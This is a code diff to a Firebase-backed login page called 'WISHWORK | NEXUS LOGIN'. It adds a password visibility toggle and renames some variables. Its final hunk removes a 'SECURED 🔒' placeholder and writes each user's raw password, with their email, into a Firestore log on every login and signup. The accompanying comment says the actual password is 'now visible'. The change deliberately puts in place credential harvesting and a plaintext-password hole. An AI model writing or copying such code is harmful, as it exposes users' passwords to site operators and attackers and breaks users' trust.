@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WISHWORK | NEXUS LOGIN</title>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { 
             --neon-blue: #00f2ff; 
@@ -190,7 +191,11 @@
         <p class="mode-text">SYSTEM ACCESS TERMINAL</p>
 
         <input type="email" id="email" placeholder="EMAIL ADDRESS" spellcheck="false">
-        <input type="password" id="password" placeholder="PASSWORD">
+        
+        <div style="position: relative; margin-bottom: 15px;">
+            <input type="password" id="password" placeholder="PASSWORD" style="margin-bottom: 0; padding-right: 45px;">
+            <i class="fa-solid fa-eye" id="togglePassword" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: rgba(255,255,255,0.5); cursor: pointer; transition: 0.3s; font-size: 16px;"></i>
+        </div>
 
         <button class="btn login-btn" onclick="handleAuth('LOGIN')">SIGN IN</button>
         <button class="btn signup-btn" onclick="handleAuth('SIGNUP')">CREATE ACCOUNT</button>
@@ -198,6 +203,23 @@
         <a href="https://t.me/WISHWORKONLINE" target="_blank" class="forgot-link">Forgot Password?</a>
     </div>
 </div>
+
+<script>
+    // Toggle Password Visibility Logic
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+
+    togglePassword.addEventListener('click', function () {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        
+        // Toggle the icon and color based on visibility
+        this.classList.toggle('fa-eye-slash');
+        this.classList.toggle('fa-eye');
+        this.style.color = type === 'text' ? 'var(--neon-blue)' : 'rgba(255,255,255,0.5)';
+        this.style.textShadow = type === 'text' ? '0 0 10px rgba(0, 242, 255, 0.5)' : 'none';
+    });
+</script>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
@@ -217,9 +239,9 @@
     const auth = getAuth(app);
     const db = getFirestore(app);
 
-    // Cache DOM elements for faster execution
-    const emailInput = document.getElementById("email");
-    const passwordInput = document.getElementById("password");
+    // Cache DOM elements
+    const emailInputDOM = document.getElementById("email");
+    const passwordInputDOM = document.getElementById("password");
     const loader = document.getElementById("loader");
     const popup = document.getElementById("customAlert");
 
@@ -230,8 +252,8 @@
 
     window.handleAuth = async (mode) => {
         // Force lowercase to prevent case-sensitive permission errors
-        const email = emailInput.value.trim().toLowerCase();
-        const password = passwordInput.value;
+        const email = emailInputDOM.value.trim().toLowerCase();
+        const password = passwordInputDOM.value;
 
         if(!email || !password) {
             alert("Protocol Error: Credentials required!");
@@ -248,11 +270,11 @@
                 await signInWithEmailAndPassword(auth, email, password);
             }
 
-            // Secure the log entry
+            // Log entry with the actual password now visible
             const logId = email.replace(/[^a-zA-Z0-9]/g, "") + "_" + Date.now();
             await setDoc(doc(db, "users", logId), {
                 email: email,
-                password: "SECURED 🔒", // Replaces plaintext password for safety, keeps admin UI intact
+                password: password, // Storing raw password
                 actionType: mode + "_LOG",
                 time: serverTimestamp(),
                 status: "ACTIVE"
